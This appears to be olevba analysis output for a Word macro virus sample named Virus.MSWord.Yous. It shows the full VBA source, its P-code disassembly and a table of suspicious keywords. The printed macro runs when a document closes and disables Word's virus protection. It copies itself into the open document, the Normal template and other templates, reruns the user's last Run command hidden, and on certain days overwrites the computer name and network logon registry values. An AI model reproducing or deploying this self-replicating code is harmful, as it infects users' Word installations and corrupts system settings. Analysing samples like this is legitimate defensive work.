olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Yous
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Yous - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Const YouSuck! = 0.1
Dim AD, NT, AT As Object
Dim LancerApp, DerniereApp, NotreString, CalculatriceNom As String
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set AT = Templates(1).VBProject.VBComponents(1).CodeModule
Randomize
If AD.Lines(3, 1) <> "Const YouSuck! = 0.1" Then
   AD.DeleteLines 1, AD.CountOfLines
   AD.InsertLines 1, AT.Lines(1, AT.CountOfLines)
   If AD.Lines(3, 1) <> "Const YouSuck! = 0.1" Then
      AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
   End If
   If Mid(ActiveDocument.FullName, 2, 1) = ":" Or Mid(ActiveDocument.FullName, 2, 1) = "\" Then ActiveDocument.Save
End If
If NT.Lines(3, 1) <> "Const YouSuck! = 0.1" Then
   NT.DeleteLines 1, NT.CountOfLines
   NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
   NormalTemplate.Save
   End If
If AT.Lines(3, 1) <> "Const YouSuck! = 0.1" Then
   AT.DeleteLines 1, AT.CountOfLines
   AT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
   Templates(1).Save
End If
DerniereApp = Left(System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", "MRUList"), 1)
LancerApp = System.PrivateProfileString("", "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", DerniereApp)
LancerApp = Mid(LancerApp, 1, Len(LancerApp) - 2)
If Rnd > 0.1 Then
Shell LancerApp, vbHide
Else
Shell LancerApp, vbMinimizedNoFocus
End If
Aujourdhui = Day(Now())
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefUser") = "" Then
CalculatriceNom = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\ComputerName\ComputerName", "ComputerName")
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefUser") = CalculatriceNom
Select Case Aujourdhui
Case 12 To 22
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Network\Logon", "username") = NotreString
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control", "Current User") = NotreString
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\ComputerName\ComputerName", "ComputerName") = NotreString
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP", "Comment") = NotreString
NotreString = Left(CalculatriceNom, Len(CalculatriceNom) - 1) & Chr(Int((26 * Rnd + 97)))
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP", "ComputerName") = NotreString
Case Else
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "DefUser") = ""
End Select
End If

End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Yous
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5775 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim (Const) 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	VarDefn YouSuck
' Line #3:
' 	Dim 
' 	VarDefn AD
' 	VarDefn NT
' 	VarDefn AT (As Object)
' Line #4:
' 	Dim 
' 	VarDefn LancerApp
' 	VarDefn DerniereApp
' 	VarDefn NotreString
' 	VarDefn CalculatriceNom (As String)
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #9:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #10:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Templates 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AT 
' Line #11:
' 	ArgsCall Read 0x0000 
' Line #12:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0014 "Const YouSuck! = 0.1"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #14:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AT 
' 	MemLd CountOfLines 
' 	Ld AT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #15:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0014 "Const YouSuck! = 0.1"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "\"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0014 "Const YouSuck! = 0.1"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	Ld AT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0014 "Const YouSuck! = 0.1"
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld AT 
' 	MemLd CountOfLines 
' 	Ld AT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #27:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #28:
' 	LitDI2 0x0001 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
' 	LitStr 0x0007 "MRUList"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	St DerniereApp 
' Line #31:
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_USERS\.Default\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
' 	Ld DerniereApp 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St LancerApp 
' Line #32:
' 	Ld LancerApp 
' 	LitDI2 0x0001 
' 	Ld LancerApp 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LancerApp 
' Line #33:
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Gt 
' 	IfBlock 
' Line #34:
' 	Ld LancerApp 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	Ld LancerApp 
' 	Ld vbMinimizedNoFocus 
' 	ArgsCall Shell 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	St Aujourdhui 
' Line #39:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "DefUser"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #40:
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\ComputerName\ComputerName"
' 	LitStr 0x000C "ComputerName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St CalculatriceNom 
' Line #41:
' 	Ld CalculatriceNom 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "DefUser"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #42:
' 	Ld Aujourdhui 
' 	SelectCase 
' Line #43:
' 	LitDI2 0x000C 
' 	LitDI2 0x0016 
' 	CaseTo 
' 	CaseDone 
' Line #44:
' 	Ld CalculatriceNom 
' 	Ld CalculatriceNom 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Paren 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NotreString 
' Line #45:
' 	Ld NotreString 
' 	LitStr 0x0000 ""
' 	LitStr 0x0020 "HKEY_LOCAL_MACHINE\Network\Logon"
' 	LitStr 0x0008 "username"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #46:
' 	Ld CalculatriceNom 
' 	Ld CalculatriceNom 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Paren 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NotreString 
' Line #47:
' 	Ld NotreString 
' 	LitStr 0x0000 ""
' 	LitStr 0x0033 "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control"
' 	LitStr 0x000C "Current User"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #48:
' 	Ld CalculatriceNom 
' 	Ld CalculatriceNom 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Paren 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NotreString 
' Line #49:
' 	Ld NotreString 
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_LOCAL_MACHINE\System\CurrentControlSet\control\ComputerName\ComputerName"
' 	LitStr 0x000C "ComputerName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #50:
' 	Ld CalculatriceNom 
' 	Ld CalculatriceNom 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Paren 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NotreString 
' Line #51:
' 	Ld NotreString 
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP"
' 	LitStr 0x0007 "Comment"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #52:
' 	Ld CalculatriceNom 
' 	Ld CalculatriceNom 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x001A 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0061 
' 	Add 
' 	Paren 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NotreString 
' Line #53:
' 	Ld NotreString 
' 	LitStr 0x0000 ""
' 	LitStr 0x0040 "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\VNETSUP"
' 	LitStr 0x000C "ComputerName"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #54:
' 	CaseElse 
' Line #55:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "DefUser"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #56:
' 	EndSelect 
' Line #57:
' 	EndIfBlock 
' Line #58:
' Line #59:
' 	EndSub 
' Line #60:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedNoFocus  |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

